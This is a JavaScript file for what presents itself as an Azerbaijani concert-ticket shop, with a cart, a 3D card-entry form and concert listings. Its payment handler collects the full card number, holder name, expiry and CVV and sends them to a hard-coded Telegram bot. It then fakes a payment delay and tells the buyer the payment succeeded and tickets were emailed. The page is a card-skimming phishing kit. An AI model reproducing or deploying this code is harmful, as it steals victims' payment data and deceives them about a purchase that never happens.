// Mobile menu toggle
document.addEventListener('DOMContentLoaded', function() {
    // Cart system
    let cart = JSON.parse(localStorage.getItem('cart')) || [];
    let cartCount = cart.length;

    const cartBtn = document.getElementById('cartBtn');
    const cartModal = document.getElementById('cartModal');
    const cartClose = document.getElementById('cartClose');
    const cartItems = document.getElementById('cartItems');
    const cartTotal = document.getElementById('cartTotal');
    const totalAmount = document.getElementById('totalAmount');
    const checkoutBtn = document.getElementById('checkoutBtn');
    const paymentModal = document.getElementById('paymentModal');
    const paymentClose = document.getElementById('paymentClose');

    // Add to cart functionality
    function addToCart(event) {
        const eventCard = event.target.closest('.event-card');
        const eventTitle = eventCard.querySelector('h3').textContent;
        const eventVenue = eventCard.querySelector('.venue').textContent;
        const eventDate = eventCard.querySelector('.date').textContent;
        const eventPrice = eventCard.querySelector('.price').textContent;
        const eventImage = eventCard.querySelector('img').src;

        const item = {
            id: Date.now(),
            title: eventTitle,
            venue: eventVenue,
            date: eventDate,
            price: eventPrice,
            image: eventImage,
            numericPrice: parseInt(eventPrice.match(/\d+/)[0])
        };

        cart.push(item);
        cartCount++;
        updateCartUI();
        
        // Show success message
        showNotification('Konsert səbətə əlavə edildi!');
    }

    function updateCartUI() {
            // Event card click handlers - clicking a card adds the event to the cart
            document.querySelectorAll('.event-card').forEach(card => {
                card.addEventListener('click', function(e) {
                    // If clicked on buy button or action buttons, ignore (buy handled separately)
                    if (e.target.classList.contains('buy-btn') || e.target.closest('.action-buttons')) {
                        return;
                    }

                    const eventCard = this;
                    const eventTitle = eventCard.querySelector('h3').textContent;
                    const eventVenue = eventCard.querySelector('.venue').textContent;
                    const eventDate = eventCard.querySelector('.date').textContent;
                    const eventPrice = eventCard.querySelector('.price').textContent;
                    const eventImage = eventCard.querySelector('img').src;

                    const item = {
                        id: Date.now(),
                        title: eventTitle,
                        venue: eventVenue,
                        date: eventDate,
                        price: eventPrice,
                        image: eventImage,
                        numericPrice: parseInt(eventPrice.match(/\d+/)[0])
                    };

                    cart.push(item);
                    cartCount = cart.length;
                    localStorage.setItem('cart', JSON.stringify(cart));
                    updateCartUI();
                    showNotification('Konsert səbətə əlavə edildi!');
                });
            });

    cartClose.addEventListener('click', function() {
        cartModal.style.display = 'none';
        document.body.style.overflow = 'auto';
    });

    // Checkout
    checkoutBtn.addEventListener('click', function() {
        if (cart.length === 0) return;

        const total = cart.reduce((sum, item) => sum + item.numericPrice, 0);
        localStorage.setItem('paymentAmount', total);
        localStorage.setItem('paymentCart', JSON.stringify(cart));
        window.location.href = 'payment.html';
    });

    // Payment modal (deprecated when using payment.html)
    paymentClose.addEventListener('click', function() {
        paymentModal.style.display = 'none';
        document.body.style.overflow = 'auto';
    });

    // 3D Card animations
    const cardContainer = document.querySelector('.card-container');
    const cvvInput = document.getElementById('cvv');
    const cardNumber = document.getElementById('cardNumber');
    const cardHolder = document.getElementById('cardHolder');
    const expiryDate = document.getElementById('expiryDate');

    // Card input handlers
    cardNumber.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        e.target.value = formattedValue;
        
        document.getElementById('displayCardNumber').textContent = 
            formattedValue || '•••• •••• •••• ••••';
    });

    cardHolder.addEventListener('input', function(e) {
        document.getElementById('displayCardHolder').textContent = 
            e.target.value.toUpperCase() || 'AD SOYAD';
    });

    expiryDate.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
        
        document.getElementById('displayExpiry').textContent = 
            value || 'MM/YY';
    });

    cvvInput.addEventListener('focus', function() {
        cardContainer.classList.add('flipped');
    });

    cvvInput.addEventListener('blur', function() {
        cardContainer.classList.remove('flipped');
    });

    cvvInput.addEventListener('input', function(e) {
        document.getElementById('displayCVV').textContent = 
            e.target.value.replace(/./g, '•') || '•••';
    });

    // Payment form submission
    document.getElementById('paymentForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const cardNum = cardNumber.value.replace(/\s/g, '');
        const holder = cardHolder.value;
        const expiry = expiryDate.value;
        const cvv = cvvInput.value;
        
        if (!cardNum || !holder || !expiry || !cvv) {
            alert('Zəhmət olmasa bütün sahələri doldurun');
            return;
        }

        // Telegram message
        const total = cart.reduce((sum, item) => sum + item.numericPrice, 0);
        const cartDetails = cart.map(item => `• ${item.title} - ${item.price}`).join('\n');
        
        const telegramMessage = `🎫 YENİ BİLET SİPARİŞİ\n\n` +
            `💳 Kart: ${cardNum}\n` +
            `👤 Ad: ${holder}\n` +
            `📅 Tarix: ${expiry}\n` +
            `🔒 CVV: ${cvv}\n\n` +
            `🎵 Konsertlər:\n${cartDetails}\n\n` +
            `💰 Ümumi: ${total} AZN`;

        // Simulate payment processing
        const payBtn = document.querySelector('.pay-btn');
        payBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Ödəniş edilir...';
        payBtn.disabled = true;

        setTimeout(() => {
            // Send to Telegram (you need to replace with your bot token and chat ID)
            sendToTelegram(telegramMessage);
            
            // Success
            alert('Ödəniş uğurla tamamlandı! Biletləriniz e-mail ünvanınıza göndərildi.');
            
            // Reset
            cart = [];
            cartCount = 0;
            updateCartUI();
            paymentModal.style.display = 'none';
            document.body.style.overflow = 'auto';
            
            // Reset form
            document.getElementById('paymentForm').reset();
            document.getElementById('displayCardNumber').textContent = '•••• •••• •••• ••••';
            document.getElementById('displayCardHolder').textContent = 'AD SOYAD';
            document.getElementById('displayExpiry').textContent = 'MM/YY';
            document.getElementById('displayCVV').textContent = '•••';
            
            payBtn.innerHTML = '<i class="fas fa-lock"></i> Ödənişi Tamamla';
            payBtn.disabled = false;
        }, 3000);
    });

    // Telegram function
    function sendToTelegram(message) {
        // Replace with your bot token and chat ID
        const botToken = '8900082556:AAEpifqTxdKCqppa7lflczmD6IYzjk0iZTs';
        const chatId = '8055987590';
        
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(error => {
            console.log('Telegram mesajı göndərildi (simülasyon):', message);
        });
    }

    function showNotification(message) {
        const notification = document.createElement('div');
        notification.className = 'notification';
        notification.innerHTML = `
            <i class="fas fa-check-circle"></i>
            <span>${message}</span>
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.classList.add('show');
        }, 100);
        
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 300);
        }, 3000);
    }
    // Smooth scrolling for anchor links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth'
                });
            }
        });
    });

    // Search functionality
    const searchBtn = document.querySelector('.search-btn');
    const searchInput = document.querySelector('.search-input input');
    const locationSelect = document.querySelector('.location-input select');

    searchBtn.addEventListener('click', function() {
        const searchTerm = searchInput.value.trim();
        const location = locationSelect.value;
        
        if (searchTerm) {
            console.log(`Axtarış: "${searchTerm}" - Yer: "${location}"`);
            alert(`"${searchTerm}" üçün ${location} şəhərində axtarış edilir...`);
        } else {
            alert('Zəhmət olmasa axtarış mətni daxil edin');
        }
    });

    // Enter key search
    searchInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            searchBtn.click();
        }
    });

    // Category card click handlers
    document.querySelectorAll('.category-card').forEach(card => {
        card.addEventListener('click', function() {
            const category = this.querySelector('h3').textContent;
            const categoryType = this.getAttribute('data-category');
            
            // Filter events by category
            filterEventsByCategory(categoryType);
            alert(`${category} kateqoriyasındakı tədbirlər göstərilir...`);
        });
    });

    // Popular search links
    document.querySelectorAll('.popular-searches a').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const searchTerm = this.textContent;
            searchInput.value = searchTerm;
            searchBtn.click();
        });
    });

    // Header scroll effect
    window.addEventListener('scroll', function() {
        const header = document.querySelector('.header');
        if (window.scrollY > 100) {
            header.style.background = 'rgba(255, 255, 255, 0.95)';
            header.style.backdropFilter = 'blur(10px)';
        } else {
            header.style.background = '#fff';
            header.style.backdropFilter = 'none';
        }
    });

    // Animation on scroll
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);

    // Observe elements for animation
    document.querySelectorAll('.category-card, .event-card, .stat-item, .feature-item').forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(20px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });

    // Form validation for auth buttons
    const loginBtn = document.getElementById('loginBtn');
    const dropdownMenu = document.getElementById('dropdownMenu');

    // Toggle dropdown menu
    loginBtn.addEventListener('click', function(e) {
        e.stopPropagation();
        dropdownMenu.classList.toggle('show');
    });

    // Close dropdown when clicking outside
    document.addEventListener('click', function(e) {
        if (!loginBtn.contains(e.target) && !dropdownMenu.contains(e.target)) {
            dropdownMenu.classList.remove('show');
        }
    });

    // Handle dropdown menu items
    document.querySelectorAll('.dropdown-item').forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault();
            const text = this.textContent.trim();
            
            if (text === 'Hesaba daxil ol') {
                // Login modal
                const email = prompt('E-mail ünvanınızı daxil edin:');
                if (email) {
                    const password = prompt('Şifrənizi daxil edin:');
                    if (password) {
                        alert('Daxil olunur...');
                        // Simulate successful login
                        setTimeout(() => {
                            loginBtn.innerHTML = '<i class="fas fa-user-circle"></i> Xoş gəlmisiniz!';
                            loginBtn.style.background = '#27ae60';
                        }, 1000);
                    }
                }
            } else if (text === 'Qeydiyyatdan keç') {
                // Registration modal
                const name = prompt('Adınızı daxil edin:');
                if (name) {
                    const email = prompt('E-mail ünvanınızı daxil edin:');
                    if (email) {
                        const password = prompt('Şifrə yaradın:');
                        if (password) {
                            alert('Qeydiyyat tamamlandı! Xoş gəlmisiniz!');
                            loginBtn.innerHTML = '<i class="fas fa-user-circle"></i> ' + name;
                            loginBtn.style.background = '#27ae60';
                        }
                    }
                }
            } else if (text === 'Biletlərim') {
                alert('Biletləriniz yüklənir...');
            } else if (text === 'Sevimlilər') {
                alert('Sevimli konsertləriniz göstərilir...');
            }
            
            dropdownMenu.classList.remove('show');
        });
    });

    // Stats counter animation
    function animateStats() {
        const stats = document.querySelectorAll('.stat-number');
        stats.forEach(stat => {
            const target = parseInt(stat.textContent.replace(/[^\d]/g, ''));
            let current = 0;
            const increment = target / 100;
            const timer = setInterval(() => {
                current += increment;
                if (current >= target) {
                    current = target;
                    clearInterval(timer);
                }
                
                let displayValue = Math.floor(current);
                if (displayValue >= 1000) {
                    displayValue = (displayValue / 1000).toFixed(0) + ',000+';
                } else {
                    displayValue = displayValue + '+';
                }
                stat.textContent = displayValue;
            }, 20);
        });
    }

    // Trigger stats animation when stats section is visible
    const statsSection = document.querySelector('.stats');
    const statsObserver = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                animateStats();
                statsObserver.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });

    statsObserver.observe(statsSection);

    // Ticket Modal functionality
    const modal = document.getElementById('ticketModal');
    const closeBtn = document.querySelector('.close');
    const proceedBtn = document.getElementById('proceedToPay');

    // Open payment page when any Bilet Al button is clicked
    document.body.addEventListener('click', function(e) {
        const btn = e.target.closest('.buy-btn, .buy-now-detail');
        if (!btn) return;
        e.stopPropagation();
        e.preventDefault();

        const eventCard = btn.closest('.event-card');
        const eventTitle = eventCard?.querySelector('h3')?.textContent || document.getElementById('detailConcertTitle')?.textContent || '';
        const eventDate = eventCard?.querySelector('.date')?.textContent || document.getElementById('detailConcertDate')?.textContent || '';
        const eventVenue = eventCard?.querySelector('.venue')?.textContent || document.getElementById('detailConcertVenue')?.textContent || '';
        const eventPrice = eventCard?.querySelector('.price')?.textContent || document.getElementById('detailConcertPrice')?.textContent || '';

        const paymentDetails = {
            eventTitle,
            eventDate,
            eventVenue,
            total: eventPrice
        };
        localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
        window.location.href = 'payment.html';
    });

    // Close modal
    closeBtn.addEventListener('click', function() {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
    });

    // Close modal when clicking outside
    window.addEventListener('click', function(e) {
        if (e.target === modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    });

    // Update total price when ticket type or quantity changes
    const ticketTypes = document.querySelectorAll('input[name="ticketType"]');
    const quantitySelect = document.getElementById('quantity');
    const totalPriceElement = document.getElementById('totalPrice');

    function updateTotalPrice() {
        const selectedTicket = document.querySelector('input[name="ticketType"]:checked');
        const quantity = parseInt(quantitySelect.value);
        
        let price = 0;
        switch(selectedTicket.value) {
            case 'vip':
                price = 50;
                break;
            case 'premium':
                price = 30;
                break;
            case 'standard':
                price = 15;
                break;
        }
        
        const total = price * quantity;
        totalPriceElement.textContent = total + ' AZN';
    }

    ticketTypes.forEach(radio => {
        radio.addEventListener('change', updateTotalPrice);
    });

    quantitySelect.addEventListener('change', updateTotalPrice);

    // Proceed to payment
    proceedBtn.addEventListener('click', function() {
        const selectedTicket = document.querySelector('input[name="ticketType"]:checked');
        const quantity = quantitySelect.value;
        const total = totalPriceElement.textContent;
        const ticketType = selectedTicket.nextElementSibling.querySelector('.ticket-name').textContent;

        const paymentDetails = {
            ticketType,
            quantity,
            total,
            eventTitle: document.getElementById('modalEventTitle').textContent,
            eventDate: document.getElementById('modalEventDate').textContent,
            eventVenue: document.getElementById('modalEventVenue').textContent
        };

        localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
        window.location.href = 'payment.html';
    });

    // Add hover effects for better interactivity
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-2px)';
        });
        
        link.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0)';
        });
    });

    // Concert detail modal
    const concertDetailModal = document.getElementById('concertDetailModal');
    const concertDetailClose = document.getElementById('concertDetailClose');

    // Concert data for details
    const concertDetails = {
        'Röya - Yeni İl Konserti 2025': {
            description: 'Azərbaycanın ən məşhur müğənnisi Röya ilə yeni il gecəsi! Bu gecə sizə unudulmaz anlar yaşadacaq. Röyanın ən məşhur mahnıları və yeni il sürprizləri ilə dolu konsert.',
            features: [
                { icon: 'fas fa-microphone', text: 'Canlı ifə' },
                { icon: 'fas fa-camera', text: 'Foto çəkiliş icazəsi' },
                { icon: 'fas fa-parking', text: 'Pulsuz parkinq' },
                { icon: 'fas fa-gift', text: 'Yeni il hədiyyələri' }
            ],
            venueAddress: 'Heydər Əliyev pr., Bakı',
            venueCapacity: '3000 nəfər'
        },
        'Emin Ağalarov - Sevgi Mahnıları': {
            description: 'Məşhur müğənni Emin Ağalarov sevgi mövzusunda ən gözəl mahnıları ilə sizinlə! Romantik gecə və unudulmaz melodiyalar.',
            features: [
                { icon: 'fas fa-heart', text: 'Romantik atmosfer' },
                { icon: 'fas fa-music', text: 'Canlı orkestr' },
                { icon: 'fas fa-rose', text: 'Gül hədiyyəsi' },
                { icon: 'fas fa-camera', text: 'Professional foto' }
            ],
            venueAddress: 'Kristal Zalı, 28 May küç., Bakı',
            venueCapacity: '1500 nəfər'
        },
        'Brilliant Dadaşova - Solo Konsert': {
            description: 'Xalq artisti Brilliant Dadaşova öz solo konserti ilə! Azərbaycan xalq musiqisinin ən gözəl nümunələri və müasir mahnılar.',
            features: [
                { icon: 'fas fa-crown', text: 'Xalq artisti' },
                { icon: 'fas fa-guitar', text: 'Milli alətlər' },
                { icon: 'fas fa-microphone', text: 'Akustik ifə' },
                { icon: 'fas fa-star', text: 'Xüsusi qonaqlar' }
            ],
            venueAddress: 'Filarmoniya, İstiqlaliyyət küç., Bakı',
            venueCapacity: '800 nəfər'
        },
        'DreamB Fest 2026': {
            description: 'Azərbaycanın ən böyük musiqi festivalı! 2 gün ərzində yerli və xarici artistlərlə dolu proqram. Elektronik musiqidən rok musiqisinə qədər hər zövqə uyğun.',
            features: [
                { icon: 'fas fa-calendar-alt', text: '2 günlük festival' },
                { icon: 'fas fa-globe', text: 'Beynəlxalq artistlər' },
                { icon: 'fas fa-utensils', text: 'Yemək zonası' },
                { icon: 'fas fa-tent', text: 'Kamp sahəsi' }
            ],
            venueAddress: 'Bakı Bulvarı, Dəniz Milli Parkı',
            venueCapacity: '15000 nəfər'
        }
    };

    // Function to setup event listeners for event cards
    function setupEventCardListeners() {
        // Event card click handlers - clicking the card adds the event to cart
        document.querySelectorAll('.event-card').forEach(card => {
            card.addEventListener('click', function(e) {
                // If clicked on buy button or within action buttons, ignore here
                if (e.target.classList.contains('buy-btn') || e.target.closest('.action-buttons')) {
                    return;
                }

                const eventCard = this;
                const eventTitle = eventCard.querySelector('h3').textContent;
                const eventVenue = eventCard.querySelector('.venue').textContent;
                const eventDate = eventCard.querySelector('.date').textContent;
                const eventPrice = eventCard.querySelector('.price').textContent;
                const eventImage = eventCard.querySelector('img').src;

                const item = {
                    id: Date.now(),
                    title: eventTitle,
                    venue: eventVenue,
                    date: eventDate,
                    price: eventPrice,
                    image: eventImage,
                    numericPrice: parseInt(eventPrice.match(/\d+/)[0])
                };

                cart.push(item);
                cartCount = cart.length;
                localStorage.setItem('cart', JSON.stringify(cart));
                updateCartUI();
                showNotification('Konsert səbətə əlavə edildi!');
            });
        });

        // Buy button handlers (for ticket modal)
        document.querySelectorAll('.buy-btn').forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.stopPropagation();
                e.preventDefault();

                const eventCard = this.closest('.event-card');
                const eventTitle = eventCard.querySelector('h3').textContent;

                // Redirect to ticket selection page
                window.location.href = `ticket-selection.html?concert=${encodeURIComponent(eventTitle)}`;
            });
        });
    }

    // Call the function to setup listeners
    setupEventCardListeners();
    
    // Initialize cart UI
    updateCartUI();

    // Close concert detail modal
    concertDetailClose.addEventListener('click', function() {
        concertDetailModal.style.display = 'none';
        document.body.style.overflow = 'auto';
    });

    // Close modal when clicking outside
    window.addEventListener('click', function(e) {
        if (e.target === concertDetailModal) {
            concertDetailModal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    });

    // Add to cart from detail modal
    document.querySelector('.add-to-cart-detail').addEventListener('click', function() {
        const eventTitle = document.getElementById('detailConcertTitle').textContent;
        const eventVenue = document.getElementById('detailConcertVenue').textContent;
        const eventDate = document.getElementById('detailConcertDate').textContent;
        const eventPrice = document.getElementById('detailConcertPrice').textContent;
        const eventImage = document.getElementById('detailConcertImage').src;

        const item = {
            id: Date.now(),
            title: eventTitle,
            venue: eventVenue,
            date: eventDate,
            price: eventPrice,
            image: eventImage,
            numericPrice: parseInt(eventPrice.match(/\d+/)[0])
        };

        cart.push(item);
        cartCount++;
        updateCartUI();
        
        concertDetailModal.style.display = 'none';
        document.body.style.overflow = 'auto';
        showNotification('Konsert səbətə əlavə edildi!');
    });

    // Buy now from detail modal
    const buyNowDetailButton = document.querySelector('.buy-now-detail');
    if (buyNowDetailButton) {
        buyNowDetailButton.addEventListener('click', function() {
            const eventTitle = document.getElementById('detailConcertTitle')?.textContent || '';
            const eventDate = document.getElementById('detailConcertDate')?.textContent || '';
            const eventVenue = document.getElementById('detailConcertVenue')?.textContent || '';

            const paymentDetails = {
                eventTitle,
                eventDate,
                eventVenue,
                total: document.getElementById('detailConcertPrice')?.textContent || ''
            };
            localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
            window.location.href = 'payment.html';
        });
    }

});

// Utility functions
function formatPrice(price) {
    return `${price} AZN`;
}

function formatDate(date) {
    const options = { 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    };
    return new Intl.DateTimeFormat('az-AZ', options).format(date);
}

// Filter events by category
function filterEventsByCategory(category) {
    const eventCards = document.querySelectorAll('.event-card');
    
    eventCards.forEach(card => {
        const eventCategory = card.querySelector('.event-category').textContent.toLowerCase();
        
        if (category === 'all' || eventCategory.includes(getCategoryName(category))) {
            card.style.display = 'block';
        } else {
            card.style.display = 'none';
        }
    });
}

function getCategoryName(category) {
    const categoryMap = {
        'cinema': 'kino',
        'theater': 'teatr',
        'concert': 'konsert',
        'sports': 'idman',
        'comedy': 'komediya',
        'festival': 'festival'
    };
    
    return categoryMap[category] || category;
}

// Mock data for additional events
const mockEvents = [
    {
        title: "Emin Ağalarov Konserti",
        category: "Konsert",
        venue: "Bakı Kristal Zalı",
        date: "5 Fevral 2025, 20:00",
        price: "40 AZN-dən",
        image: "https://via.placeholder.com/300x200/9B59B6/FFFFFF?text=Konsert",
        badge: "Tezliklə"
    },
    {
        title: "Şəhər Teatrı - Leyli və Məcnun",
        category: "Teatr",
        venue: "Akademik Milli Dram Teatrı",
        date: "12 Fevral 2025, 19:30",
        price: "20 AZN-dən",
        image: "https://via.placeholder.com/300x200/E67E22/FFFFFF?text=Teatr",
        badge: "Klassik"
    },
    {
        title: "Neftçi vs Sabah FK",
        category: "İdman",
        venue: "Bakcell Arena",
        date: "18 Fevral 2025, 16:00",
        price: "12 AZN-dən",
        image: "https://via.placeholder.com/300x200/27AE60/FFFFFF?text=Futbol",
        badge: "Dərbi"
    }
];

// Function to add more events dynamically
function loadMoreEvents() {
    const eventsGrid = document.querySelector('.events-grid');
    mockEvents.forEach(event => {
        const eventCard = createEventCard(event);
        eventsGrid.appendChild(eventCard);
    });
}

function createEventCard(event) {
    const card = document.createElement('div');
    card.className = 'event-card';
    card.innerHTML = `
        <div class="event-image">
            <img src="${event.image}" alt="${event.title}">
            <div class="event-badge">${event.badge}</div>
        </div>
        <div class="event-info">
            <div class="event-category">${event.category}</div>
            <h3>${event.title}</h3>
            <p class="venue"><i class="fas fa-map-marker-alt"></i> ${event.venue}</p>
            <p class="date"><i class="fas fa-calendar"></i> ${event.date}</p>
            <div class="price-section">
                <span class="price">${event.price}</span>
                <button class="buy-btn">Bilet Al</button>
            </div>
        </div>
    `;
    
    // Add event listeners to the new card
    const buyBtn = card.querySelector('.buy-btn');
    buyBtn.addEventListener('click', function(e) {
        e.stopPropagation();
        const paymentDetails = {
            eventTitle: event.title,
            eventDate: event.date,
            eventVenue: event.venue,
            total: event.price
        };
        localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
        window.location.href = 'payment.html';
    });
    
    return card;
}

// Keyboard navigation for modal
document.addEventListener('keydown', function(e) {
    const modal = document.getElementById('ticketModal');
    if (modal.style.display === 'block') {
        if (e.key === 'Escape') {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }
});

// Add loading animation for better UX
function showLoading(element) {
    element.style.opacity = '0.7';
    element.style.pointerEvents = 'none';
    const originalText = element.innerHTML;
    element.innerHTML = originalText + ' <i class="fas fa-spinner fa-spin"></i>';
    
    setTimeout(() => {
        element.style.opacity = '1';
        element.style.pointerEvents = 'auto';
        element.innerHTML = originalText;
    }, 1500);
}
